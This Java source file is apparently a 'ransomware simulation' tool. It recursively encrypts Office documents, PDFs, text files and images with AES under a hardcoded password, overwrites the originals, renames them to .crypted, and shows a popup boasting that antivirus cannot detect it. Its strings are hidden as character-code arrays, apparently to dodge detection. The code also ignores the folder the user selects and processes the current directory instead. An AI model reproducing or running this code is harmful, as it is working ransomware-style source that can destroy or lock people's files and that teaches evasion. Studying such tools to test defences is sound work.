import java.util.Scanner;
import java.io.File;
import java.io.FilenameFilter;
import java.io.IOException;

import javax.crypto.*;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.SecretKeySpec;
import java.nio.ByteBuffer;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.security.spec.InvalidKeySpecException;
import java.security.spec.KeySpec;

import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.Date;

import java.io.*;
import java.nio.file.StandardCopyOption;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

import java.awt.BorderLayout;
import java.awt.event.ActionEvent;
import javax.swing.*;
import java.awt.event.*;
import javax.swing.*;
import java.awt.*;

import java.net.URI;
import java.awt.Desktop;


public class EncryptDelTestv4 extends JPanel implements ActionListener {
  private static Cipher encrypt;
  private static Cipher decrypt;
  private static JTextArea textarea = new JTextArea(40, 60);
  String thisselection[]={"Please select","Encrypt","Decrypt"};
  private JComboBox cb = new JComboBox(thisselection);
  private static JButton button = new JButton("Choose a folder or network drive to process the test");
  private static final byte[] initialization_vector = {99,11,88,00,55,66,33,22};
  private static SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd");
  private static Date today = new Date();
  public static int encryptedcount;
  public static String password = "testkey@123";
  public static String option;
  public static String strEncrypt = Character.toString((char) 69) + Character.toString((char) 110) + Character.toString((char) 99)  + Character.toString((char) 114)  + Character.toString((char) 121)  + Character.toString((char) 112) + Character.toString((char) 116);
  public static String strDecrypt = Character.toString((char) 68) + Character.toString((char) 101) + Character.toString((char) 99)  + Character.toString((char) 114)  + Character.toString((char) 121)  + Character.toString((char) 112) + Character.toString((char) 116);
  
  public EncryptDelTestv4(){
    JFrame frame = new JFrame("[Encrypt Delete Test v4]");
    textarea.setFocusable(false);
    textarea.setWrapStyleWord(false);
    textarea.setLineWrap(false);
    Font font = new Font("Courier New", Font.BOLD, 12);
    textarea.setFont(font);
    JScrollPane scrollpane = new JScrollPane(textarea);
    scrollpane.setVerticalScrollBarPolicy(JScrollPane.VERTICAL_SCROLLBAR_ALWAYS);
    
    frame.setBounds(3, 3, 3, 3);
    frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
    frame.getContentPane().setLayout(new BorderLayout(3, 3));
    frame.getContentPane().add(new JScrollPane(textarea), BorderLayout.CENTER);
    JPanel panel = new JPanel(new GridLayout(2, 1));
    panel.add(cb);
    panel.add(button);
    frame.getContentPane().add(panel, BorderLayout.SOUTH);
    frame.pack();
    frame.setLocationRelativeTo(null);
    frame.setVisible(true);
    button.addActionListener(this);
  } 
  
  public static void main(String[] args) throws IOException, ParseException {
    new EncryptDelTestv4();
    int CharNum[] = {91,69,110,99,114,121,112,116,32,68,101,108,101,116,101,32,84,101,115,116,32,118,52,32,40,74,97,118,97,41,93};
    textarea.append(NumtoString(CharNum)+"\n");
    CharNum = new int[]{83,105,109,117,108,97,116,101,32,114,97,110,115,111,109,119,97,114,101,32,101,110,99,114,121,112,116,105,111,110,32,111,112,101,114,97,116,105,111,110};
    textarea.append(NumtoString(CharNum)+"\n");
    CharNum = new int[]{66,121,32,69,100,100,105,101,32,67,104,117,32,101,100,100,105,101,99,104,117,46,97,110,100,114,111,105,100,64,103,109,97,105,108,46,99,111,109};
    textarea.append(NumtoString(CharNum)+"\n");
    CharNum = new int[]{80,108,101,97,115,101,32,100,111,119,110,108,111,97,100,32,116,104,101,32,111,114,105,103,105,110,97,108,32,97,110,100,32,108,97,116,101,115,116,32,118,101,114,115,105,111,110,32,102,114,111,109};
    textarea.append(NumtoString(CharNum)+"\n");
    CharNum = new int[]{104,116,116,112,115,58,47,47,103,105,116,104,117,98,46,99,111,109,47,101,100,100,105,101,99,104,117,47,69,110,99,114,121,112,116,45,68,101,108,101,116,101,45,84,101,115,116};
    textarea.append(NumtoString(CharNum)+"\n");
    CharNum = new int[]{86,101,114,115,105,111,110,32,118,52,46,48,46,49,32,40,55,47,79,99,116,47,50,48,50,49,41};
    textarea.append(NumtoString(CharNum)+"\n");
    textarea.append("\n");
    CharNum = new int[]{84,104,105,115,32,116,111,111,108,32,101,110,99,114,121,112,116,115,32,45,32,111,118,101,114,119,114,105,116,101,115,32,45,32,114,101,110,97,109,101,115,32,116,104,101,32,102,105,108,101,32,117,110,100,101,114,32,115,101,108,101,99,116,101,100,32,102,111,108,100,101,114,32,97,110,100,32,105,116,39,115,32,115,117,98,102,111,108,100,101,114,40,115,41,41};
    textarea.append(NumtoString(CharNum)+"\n");
    textarea.append("\n");
    CharNum = new int[]{91,67,97,117,116,105,111,110,93};
    textarea.append(NumtoString(CharNum)+"\n");
    CharNum = new int[]{89,111,117,32,117,115,101,32,116,104,105,115,32,116,111,111,108,32,99,111,109,112,108,101,116,101,108,121,32,97,116,32,121,111,117,114,32,111,119,110,32,114,105,115,107,46};
    textarea.append(NumtoString(CharNum)+"\n");
    textarea.append("\n");
    CharNum = new int[]{80,108,101,97,115,101,32,99,104,111,111,115,101,32,116,104,101,32,111,112,116,105,111,110,32,97,116,32,116,104,101,32,98,111,116,116,111,109,32,116,111,32,112,114,111,99,101,101,100};
    textarea.append(NumtoString(CharNum)+"\n");
    textarea.setCaretPosition(textarea.getDocument().getLength());
  }

  public static void goProcess() {
    File file;
    final JFileChooser jfc = new JFileChooser();
    jfc.setCurrentDirectory(new java.io.File("."));
    jfc.setDialogTitle("Choose a folder or network drive: ");
    jfc.setFileSelectionMode(JFileChooser.DIRECTORIES_ONLY);   
    int returnValue = jfc.showOpenDialog(null);
    if (returnValue == JFileChooser.APPROVE_OPTION){
      file = jfc.getSelectedFile();
      textarea.append("\n");
      File currentDir = new File("."); 
      traverseDirectory(currentDir);

      if (option.equals(strEncrypt)) {
        try {
          BufferedWriter out = new BufferedWriter(new FileWriter("popup.html"));
          int CharNum[] = {60,104,116,109,108,62};
          out.write(NumtoString(CharNum)+"\n");
          CharNum = new int[]{60,104,101,97,100,62};
          out.write(NumtoString(CharNum)+"\n");
          CharNum = new int[]{60,116,105,116,108,101,62,69,110,99,114,121,112,116,68,101,108,84,101,115,116,118,52,60,47,116,105,116,108,101,62};
          out.write(NumtoString(CharNum)+"\n");
          CharNum = new int[]{60,98,111,100,121,32,98,103,99,111,108,111,114,61,114,101,100,62};
          out.write(NumtoString(CharNum)+"\n");
          CharNum = new int[]{60,102,111,110,116,32,115,105,122,101,61,43,49,48,32,99,111,108,111,114,61,119,104,105,116,101,62,60,98,62,91,69,110,99,114,121,112,116,68,101,108,84,101,115,116,118,52,32,40,74,97,118,97,41,93,60,47,98,62,60,47,102,111,110,116,62,60,98,114,62,60,98,114,62,60,98,114,62,60,98,114,62};
          out.write(NumtoString(CharNum)+"\n");
          CharNum = new int[]{60,102,111,110,116,32,115,105,122,101,61,43,49,48,32,99,111,108,111,114,61,119,104,105,116,101,62,84,104,97,110,107,115,32,102,111,114,32,121,111,117,114,32,116,101,115,116,33,60,47,102,111,110,116,62,60,98,114,62,60,98,114,62};
          out.write(NumtoString(CharNum)+"\n");
          CharNum = new int[]{60,102,111,110,116,32,115,105,122,101,61,43,49,48,32,99,111,108,111,114,61,119,104,105,116,101,62,89,111,117,114,32,97,110,116,105,45,118,105,114,117,115,32,115,111,102,116,119,97,114,101,32,60,117,62,67,65,78,78,79,84,60,47,117,62,32,100,101,116,101,99,116,32,116,104,105,115,32,116,101,115,116,60,47,102,111,110,116,62,60,98,114,62,60,98,114,62};
          out.write(NumtoString(CharNum)+"\n");
          out.write("<br>\n");
          out.write("<br>\n");
          CharNum = new int[]{60,98,114,62,69,110,99,114,121,112,116,105,111,110,32,75,101,121,58,32};
          out.write(NumtoString(CharNum) + password + "\n");
          CharNum = new int[]{60,98,114,62,69,110,99,114,121,112,116,101,100,32,70,105,108,101,58,32};
          out.write(NumtoString(CharNum) + encryptedcount + "\n");
          out.write("<br>" + sdf.format(today) + "\n");
          out.write("<br>\n");
          CharNum = new int[]{60,47,98,111,100,121,62};
          out.write(NumtoString(CharNum)+"\n");
          CharNum = new int[]{60,47,104,116,109,108,62};
          out.write(NumtoString(CharNum)+"\n");
          out.close();
        }
        catch (IOException e) {
        }    

        textarea.append("\n");
        if (encryptedcount > 0){
          java.awt.Desktop desktop = java.awt.Desktop.getDesktop();
          if( desktop.isSupported( java.awt.Desktop.Action.BROWSE ) ) {
            try {
              java.net.URI uri = new java.net.URI("popup.html");
              desktop.browse( uri );
            }
            catch ( Exception e ) {
              System.err.println( e.getMessage() );
            }
          }
          int CharNum[] = {69,110,99,114,121,112,116,105,111,110,32,75,101,121,58,32};
          textarea.append(NumtoString(CharNum) + password + "\n");
          CharNum = new int[]{69,110,99,114,121,112,116,101,100,32,70,105,108,101,58,32};
          textarea.append(NumtoString(CharNum) + encryptedcount + "\n");
          textarea.setForeground(Color.RED);
          CharNum = new int[]{79,112,101,114,97,116,105,111,110,32,99,111,109,112,108,101,116,101,100,33};
          textarea.append("\n");
          textarea.append(NumtoString(CharNum) + "\n");
        } else {
          int CharNum[] = {78,111,32,102,105,108,101,32,105,115,32,102,111,117,110,100,32,111,114,32,101,110,99,114,121,112,116,101,100};
          textarea.append(NumtoString(CharNum) + "\n");   
        }
        textarea.setCaretPosition(textarea.getDocument().getLength());
        JFrame f; 
        f=new JFrame(); 
        if (encryptedcount > 0){
          int CharNum[] = {79,112,101,114,97,116,105,111,110,32,99,111,109,112,108,101,116,101,100,33};
          JOptionPane.showMessageDialog(f,NumtoString(CharNum),"[Encrypt Delete Test v4]",JOptionPane.ERROR_MESSAGE);
        }
      } else if (option.equals(strDecrypt)){
        int CharNum[] = {79,112,101,114,97,116,105,111,110,32,99,111,109,112,108,101,116,101,100,33};
        textarea.append(NumtoString(CharNum) + "\n");
        JFrame f; 
        f=new JFrame(); 
        JOptionPane.showMessageDialog(f,NumtoString(CharNum),"[Encrypt Delete Test v4]",JOptionPane.ERROR_MESSAGE);
      }
    }
  }
  
  public static void traverseDirectory(File dir) {
    try {
      File[] files = dir.listFiles();
      for (File file: files) {
        if (file.isDirectory()) {
          traverseDirectory(file);
        } else {
          if (option.equals(strEncrypt)){
            if (file.getCanonicalPath().toLowerCase().endsWith(".doc") || file.getCanonicalPath().toLowerCase().endsWith(".docx") || file.getCanonicalPath().toLowerCase().endsWith(".xls") || file.getCanonicalPath().toLowerCase().endsWith(".xlsx") || file.getCanonicalPath().toLowerCase().endsWith(".txt") || file.getCanonicalPath().toLowerCase().endsWith(".rtf") || file.getCanonicalPath().toLowerCase().endsWith(".pdf") || file.getCanonicalPath().toLowerCase().endsWith(".jpg") || file.getCanonicalPath().toLowerCase().endsWith(".jpeg") || file.getCanonicalPath().toLowerCase().endsWith(".gif") || file.getCanonicalPath().toLowerCase().endsWith(".bmp") || file.getCanonicalPath().toLowerCase().endsWith(".png")){
              cryptOperation(file.getCanonicalPath());
            }
          }else{
            if (file.getCanonicalPath().toLowerCase().endsWith(".crypted")){
              cryptOperation(file.getCanonicalPath());
            }
          }
        }
      }
    } catch (IOException e) {
      e.printStackTrace();
    }
  }
  
  public static String NumtoString(int[] NumArray){
    String str = "";
    for (int i: NumArray) {
      str += Character.toString((char) i);
    }
    return str;
  }

  public static void cryptOperation(String filename) {
    try {
      if (option.equals(strEncrypt)) {
        int CharNum[] = {99,114,121,112,116};
        String outputfile = filename + "." + NumtoString(CharNum) + "ed";
        textarea.append("Encrypt and overwrite to " + filename + "\n");

        Path path = Paths.get(filename);
        byte[] fileBytes = Files.readAllBytes(path);
        byte[] resultBytes = null;
        resultBytes = encryptData(password, fileBytes);

        File writefile = new File(filename);
        try (FileOutputStream outputStream = new FileOutputStream(writefile)) {
          outputStream.write(resultBytes);
        }

        textarea.append("Rename to " + outputfile + "\n");
        File file = new File(filename);
        Path pathoutputile = Paths.get(outputfile);
        Path pathinputile = Paths.get(filename);
        Files.move(pathinputile, pathoutputile);
        File f = new File(outputfile);
        if (f.exists() && f.isFile()) {
          encryptedcount = encryptedcount + 1;
        }
        textarea.append("\n");
    
      } else if (option.equals(strDecrypt)) {
        String outputfile = filename.replaceAll(".crypted$","");
        textarea.append("Decrypt to " + outputfile + "\n");

        Path path = Paths.get(filename);
        byte[] fileBytes = Files.readAllBytes(path);
        byte[] resultBytes = null;
        resultBytes = decryptData(password, fileBytes);

        File writefile = new File(outputfile);
        try (FileOutputStream outputStream = new FileOutputStream(writefile)) {
          outputStream.write(resultBytes);
        }
        textarea.append("\n");
      } 
    } catch (NoSuchPaddingException | NoSuchAlgorithmException | InvalidAlgorithmParameterException | InvalidKeyException | BadPaddingException | IllegalBlockSizeException | InvalidKeySpecException | IOException e) {
      e.printStackTrace();
    }
  }

  public static byte [] encryptData(String key, byte [] data) throws NoSuchPaddingException,
    NoSuchAlgorithmException,
    InvalidAlgorithmParameterException,
    InvalidKeyException,
    BadPaddingException,
    IllegalBlockSizeException, InvalidKeySpecException {

    SecureRandom secureRandom = new SecureRandom();
    byte[] iv = new byte[12];
    secureRandom.nextBytes(iv);
    SecretKey secretKey = generateSecretKey(key, iv);
    Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
    GCMParameterSpec parameterSpec = new GCMParameterSpec(128, iv);
    cipher.init(Cipher.ENCRYPT_MODE, secretKey, parameterSpec);
    byte [] encryptedData = cipher.doFinal(data);
    ByteBuffer byteBuffer = ByteBuffer.allocate(4 + iv.length + encryptedData.length);
    byteBuffer.putInt(iv.length);
    byteBuffer.put(iv);
    byteBuffer.put(encryptedData);
    return byteBuffer.array();
  }

  public static byte [] decryptData(String key, byte [] encryptedData) 
    throws NoSuchPaddingException, 
    NoSuchAlgorithmException, 
    InvalidAlgorithmParameterException, 
    InvalidKeyException, 
    BadPaddingException, 
    IllegalBlockSizeException, 
    InvalidKeySpecException {

    ByteBuffer byteBuffer = ByteBuffer.wrap(encryptedData);
    int noonceSize = byteBuffer.getInt();
    if(noonceSize < 12 || noonceSize >= 16) {
      throw new IllegalArgumentException("Nonce size is incorrect.");
    }
    byte[] iv = new byte[noonceSize];
    byteBuffer.get(iv);
    SecretKey secretKey = generateSecretKey(key, iv);
    byte[] cipherBytes = new byte[byteBuffer.remaining()];
    byteBuffer.get(cipherBytes);
    Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
    GCMParameterSpec parameterSpec = new GCMParameterSpec(128, iv);
    cipher.init(Cipher.DECRYPT_MODE, secretKey, parameterSpec);
    return cipher.doFinal(cipherBytes);
  }

  public static SecretKey generateSecretKey(String password, byte [] iv) throws NoSuchAlgorithmException, InvalidKeySpecException {
    KeySpec spec = new PBEKeySpec(password.toCharArray(), iv, 65536, 128); // AES-128
    SecretKeyFactory secretKeyFactory = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1");
    byte[] key = secretKeyFactory.generateSecret(spec).getEncoded();
    return new SecretKeySpec(key, "AES");
  }

  @Override
  public void actionPerformed(ActionEvent e){
    if ( strEncrypt.equals(cb.getSelectedItem().toString()) || strDecrypt.equals(cb.getSelectedItem().toString())) {
      option = cb.getSelectedItem().toString();
      goProcess();
    } else {
      JOptionPane.showMessageDialog(this, "Please select option","[Encrypt Delete Test v4]", JOptionPane.ERROR_MESSAGE);
    }
  }
 
}
